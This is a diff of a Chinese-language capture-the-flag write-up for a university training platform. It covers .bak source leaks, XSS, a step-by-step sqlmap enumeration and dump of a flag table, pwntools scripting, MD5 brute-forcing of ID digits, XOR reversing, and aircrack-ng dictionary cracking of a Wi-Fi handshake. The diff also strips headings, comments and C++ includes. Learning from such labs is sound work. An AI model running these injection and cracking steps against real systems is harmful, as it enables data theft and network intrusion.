@@ -1,10 +1,10 @@
 # ZJU SchoolBus Writeup
 
-## Web
+ Web
 
-### EasyWeb
+ EasyWeb
 
-#### 第一关（.bak）
+ 第一关（.bak）
 
 查看.bak文件
 
@@ -26,7 +26,7 @@ http://10.214.160.13:10000/1.php.bak
 </html>
 ```
 
-#### 第二关（XSS）
+ 第二关（XSS）
 
 跨脚本漏洞XSS
 
@@ -36,11 +36,11 @@ http://10.214.160.13:10000/1.php.bak
 
 好像firefox直接禁掉弹窗可以绕过去
 
-#### 第三关（消息头）
+ 第三关（消息头）
 
 网络$\to$ disiguan.php$\to$ Headers$\to$ Response Headers(wozaizheli.php)
 
-#### 第四关
+ 第四关
 
 删掉选中行的display得到flag
 
@@ -48,65 +48,65 @@ http://10.214.160.13:10000/1.php.bak
 
 
 
-### SQLinjection
+ SQLinjection
 
 在后台数据库中找一个名叫flag_is_here的表里的flag
 
-#### SQLMAP的使用
+ SQLMAP的使用
 
 [基本操作](https://www.jianshu.com/p/63becdb8c2f8)
 
 思路：获取数据库名称，得知所需要的表名，获取列名，获取指定列名字段
 
 ```shell
-#判断url的数据库是否存在注入点
+
 python3 sqlmap.py -u http://10.214.160.13:10002/?questionid=0
 ```
 
 ![image-20211003212834051](https://zerokei-imgurl.oss-cn-hangzhou.aliyuncs.com/img/image-20211003212834051.png)
 
 ```shell
-#枚举DBMS所有数据库
+
 python3 sqlmap.py -u http://10.214.160.13:10002/?questionid=0 --dbs
 ```
 
 ![image-20211003212932141](https://zerokei-imgurl.oss-cn-hangzhou.aliyuncs.com/img/image-20211003212932141.png)
 
 ```shell
-#枚举数据库中所有的数据表
+
 python3 sqlmap.py -u http://10.214.160.13:10002/?questionid=0 -D aaa_web2 --tables
 ```
 
 ![image-20211003220358984](https://zerokei-imgurl.oss-cn-hangzhou.aliyuncs.com/img/image-20211003220358984.png)
 
 ```shell
-#枚举数据库中指定数据表中的所有字段
+
 python3 sqlmap.py -u http://10.214.160.13:10002/?questionid=0 -D aaa_web2 -T flag_is_here --column
 ```
 
 ![image-20211003220016540](https://zerokei-imgurl.oss-cn-hangzhou.aliyuncs.com/img/image-20211003220016540.png)
 
 ```shell
-#导出数据表中的列字段进行保存
+
 sqlmap.py -u http://10.214.160.13:10002/?questionid=0 -D aaa_web2 -T flag_is_here -C "flag" --dump
 ```
 
 ![image-20211003220044730](https://zerokei-imgurl.oss-cn-hangzhou.aliyuncs.com/img/image-20211003220044730.png)
 
-## PPC
+ PPC
 
-### calculator
+ calculator
 
 [基本操作](https://ce2191210307.gitee.io/2020/06/03/pwntools%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8Apwn%E5%85%A5%E9%97%A8/)
 
-#### Description
+ Description
 
 编程是最重要的技能，没有之一 
 我就不信你的手速足够快hhh 
 nc 10.214.160.13 11002 
 nc是Linux自带的工具，用于与服务器建立socket连接
 
-#### Solution
+ Solution
 
 [入门链接](https://ce2191210307.gitee.io/2020/06/03/pwntools%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8Apwn%E5%85%A5%E9%97%A8/)
 
@@ -132,11 +132,11 @@ s=p.recvlines(4)
 print(s)
 ```
 
-### WUD1T1
+ WUD1T1
 
 大概就是根据题面给出的信息确定身份证的某几位，其他的暴力枚举
 
-#### md5加密
+ md5加密
 
 ```python
 import hashlib
@@ -146,18 +146,18 @@ def get_md5(s):
 	return md.hexdigest()
 ```
 
-## Reverse
+ Reverse
 
-### Reverse1
+ Reverse1
 
 一道简单的逆向题
 
 flag加密存于内存区内，与Ch异或后取出值
 
 ```cpp
-#include<stdio.h>
-#include<string>
-#include<iostream>
+
+
+
 using namespace std;
 void int2str(const int &int_temp,string &string_temp)  
 {  
@@ -184,19 +184,19 @@ int main(){
 
 
 
-## MISC
+ MISC
 
-### WUD1T2
+ WUD1T2
 
-#### aircrack-ng撞库
+ aircrack-ng撞库
 
 题目已给出握手包，直接用现有的字典库破解就行
 
 ```shell
-aircrack-ng -w password.txt crack_zju-01.cap #password.txt为字典库
+aircrack-ng -w password.txt crack_zju-01.cap 
 ```
 
-#### vim .swp文件复原
+ vim .swp文件复原
 
 ```shell
 vim -r 复原文件名（不带.swp）
